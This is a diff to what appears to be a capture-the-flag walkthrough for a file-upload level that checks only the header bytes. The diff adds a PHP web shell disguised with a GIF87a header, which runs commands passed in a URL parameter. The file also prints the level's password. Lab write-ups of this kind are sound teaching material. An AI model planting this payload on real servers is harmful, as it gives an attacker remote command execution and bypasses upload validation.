@@ -17,8 +17,10 @@ Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
     - If the file does not begin with the header bytes that indicate it actually is an image file, it will be rejected
     - GIF start with this headers: `GIF87a`
 - Solution:
+  ```php
+  GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+  ```
   ![image](https://github.com/user-attachments/assets/24417e03-53af-4f51-9b64-08b9d67a0c86)
-
-
+  ![image](https://github.com/user-attachments/assets/9d611fca-81af-4138-9e27-d69e5be070f9)
 
 - Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
